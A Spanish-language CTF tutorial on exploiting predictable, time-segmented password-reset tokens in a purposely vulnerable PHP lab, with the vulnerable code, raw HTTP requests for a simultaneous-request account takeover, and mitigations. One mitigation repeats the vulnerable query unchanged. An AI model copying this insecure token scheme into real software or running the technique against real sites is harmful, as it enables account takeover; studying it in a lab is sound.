---
icon: paper-plane
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Time-based Token Vulnerability Exploitation

## Introducción

En este caso la vulnerabilidad se va a centrar en que cada usuario tendra una bandeja de entrada como en un `email` donde le llegara la `URL` con el `TOKEN` que tiene que ser valido, estos `TOKENs` se generan por marcas de tiempo, por lo que podremos suplantar un `TOKEN` que se genere para cambiar la contraseña de otro usuario enviando dos peticiones de forma simultanea y conseguir obtener el `TOKEN` de cambio de contraseña del otro usuario.

## CTF para practicar

URL = Download CTF Time-based Token

## Código Vulnerable

#### 1. Generación de Tokens Basada en Tiempo (config.php)

```php
// VULNERABILIDAD: Token generado basándose en segmentos de tiempo
function generateResetToken($username) {
    global $pdo;
    
    // Limpiar tokens expirados (más de 10 minutos)
    $pdo->prepare("DELETE FROM reset_tokens WHERE created_at < datetime('now', '-10 minutes')")->execute();
    
    // VULNERABILIDAD CRÍTICA: Usar segmentos de tiempo predecibles
    // El token cambia solo cada 10 segundos, permitiendo ventana de ataque
    $time_segment = floor(time() / 10); // ¡VULNERABLE! Cambia cada 10 segundos
    
    // VULNERABILIDAD: Token no incluye información única del usuario
    // Mismo token generado para todos los usuarios en el mismo time_segment
    $token = hash('sha256', $time_segment . 'weak_secret_salt');
    
    // Debug: registrar el timestamp para verificar
    error_log("Token generado para $username - Time segment: $time_segment - Token: " . substr($token, 0, 16) . "...");
    
    // Guardar token en la base de datos
    $stmt = $pdo->prepare("INSERT INTO reset_tokens (username, token) VALUES (?, ?)");
    $stmt->execute([$username, $token]);
    
    return $token;
}
```

**Problemas de seguridad:**

* ✅ **Time-based**: Los tokens se generan basándose en `floor(time() / 10)`
* ✅ **No único por usuario**: Mismo token para todos los usuarios en el mismo segmento de tiempo
* ✅ **Secret débil**: Usa 'weak\_secret\_salt' como salt predecible
* ✅ **Ventana de 10 segundos**: Ampla ventana para ataques simultáneos

#### 2. Verificación de Tokens (config.php)

```php
function verifyResetToken($username, $token) {
    global $pdo;
    
    // Limpiar tokens expirados
    $pdo->prepare("DELETE FROM reset_tokens WHERE created_at < datetime('now', '-10 minutes')")->execute();
    
    // VULNERABILIDAD: Verificación no valida la propiedad del token
    // Cualquier usuario puede usar cualquier token válido
    $stmt = $pdo->prepare("SELECT * FROM reset_tokens WHERE username = ? AND token = ? AND used = 0");
    $stmt->execute([$username, $token]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

**Problemas de seguridad:**

* ✅ **Falta de vinculación usuario-token**: El sistema no verifica que el token fue generado específicamente para ese usuario
* ✅ **Reutilización potencial**: Múltiples usuarios pueden usar el mismo token

#### 3. Endpoint de Recuperación (forgot-password.php)

```php
// VULNERABILIDAD: No hay rate limiting ni protección contra ataques simultáneos
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $post_data = file_get_contents('php://input');
    parse_str($post_data, $post_params);
    
    $username = $post_params['username'] ?? '';
    $csrf_token = $post_params['csrf'] ?? '';
    
    if (!empty($username)) {
        if (!verifyCSRFToken($csrf_token)) {
            $message = "Token de seguridad inválido";
        } else {
            // VULNERABILIDAD: Generación de token sin verificar intentos previos
            $token = generateResetToken($username); // Se genera inmediatamente
            
            $reset_url = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . 
                        "/reset-password.php?token=" . $token . "&username=" . urlencode($username);
            
            // El token se envía al "email" simulado del usuario
            saveEmailToInbox($username, $email_data);
        }
    }
}
```

**Problemas de seguridad:**

* ✅ **No rate limiting**: Múltiples solicitudes permitidas sin restricción
* ✅ **Generación inmediata**: Token se genera sin verificar abuso
* ✅ **Parámetro username en URL**: Permite fácil manipulación

### Mecanismo de Explotación

#### Flujo del Ataque

1. **Preparación**: Obtener dos sesiones diferentes (PHPSESSID)
2. **Ataque Simultáneo**: Enviar peticiones casi al mismo tiempo
3. **Token Compartido**: Ambos usuarios reciben el mismo token
4. **Suplantación**: Usar el token de un usuario para otro

#### Obtener CSRF y PHPSESSIONID de Victim

Tendremos que obligar al servidor que nos genere una nueva "sesion" para modificarla en la segunda peticion donde pondremos nuestro nombre de usuario.

```txt
# Petición: Para generar sesion
GET /forgot-password.php HTTP/1.1
Host: 172.17.0.2
Content-Type: application/x-www-form-urlencoded
Cookie: 

csrf=&username=
```

Dejamos los campos vacios y le damos a enviar, en la respuesta del servidor tendremos que ver que se nos genera un nuevo `PHPSESSIONID` y un `CSRF` bajando un poco en el codigo que esta con a etiqueta `hidden`.

Esa informacion la tendremos que modificar en la `Peticion 2` del siguiente cuadro.

#### Peticiones de Explotación

```html
# Petición 1: Para usuario atacante (diseo)
POST /forgot-password.php HTTP/1.1
Host: 172.17.0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=session_diseo

csrf=CSRF_DISEO&username=victim

# Petición 2: Para usuario victima (victim)  
POST /forgot-password.php HTTP/1.1
Host: 172.17.0.2
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=SESSION_GENERADO

csrf=CSRF_GENERADO&username=diseo
```

#### Resultado Esperado

Ambos usuarios recibirán el **mismo token** si las peticiones se procesan en el mismo segmento de tiempo (10 segundos).

### Proof of Concept

#### URL de Reset Compartida

```txt
# URL para victim (legítima)
http://172.17.0.2/reset-password.php?token=a1b2c3d4e5f6&username=victim

# URL para diseo (explotada) - MISMO TOKEN
http://172.17.0.2/reset-password.php?token=a1b2c3d4e5f6&username=diseo
```

#### Verificación de la Vulnerabilidad

```bash
# Los tokens serán idénticos si se generan en el mismo time segment
Time Segment: 1732821100
Token victim: a1b2c3d4e5f678901234567890123456
Token diseo:  a1b2c3d4e5f678901234567890123456  # ¡IGUAL!
```

### Mitigaciones

#### Solución 1: Tokens Únicos por Usuario

```php
function generateSecureResetToken($username) {
    $token = bin2hex(random_bytes(32)); // Token realmente aleatorio
    $token .= hash('sha256', $username . $token . microtime(true));
    return $token;
}
```

#### Solución 2: Vinculación Usuario-Token

```php
function verifySecureResetToken($username, $token) {
    // Verificar que el token fue generado específicamente para este usuario
    $stmt = $pdo->prepare("SELECT * FROM reset_tokens WHERE username = ? AND token = ? AND used = 0");
    $stmt->execute([$username, $token]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

#### Solución 3: Rate Limiting

```php
// Implementar límite de intentos por IP/usuario
function checkRateLimit($username, $ip) {
    $max_attempts = 3;
    $time_window = 900; // 15 minutos
    // Verificar y bloquear si excede el límite
}
```

### Conclusión

Esta vulnerabilidad demuestra los peligros de usar componentes predecibles (como el tiempo) en la generación de tokens de seguridad. La combinación de tokens time-based con falta de vinculación usuario-token crea una ventana de explotación crítica que permite a un atacante resetear contraseñas de otros usuarios mediante ataques de race condition.
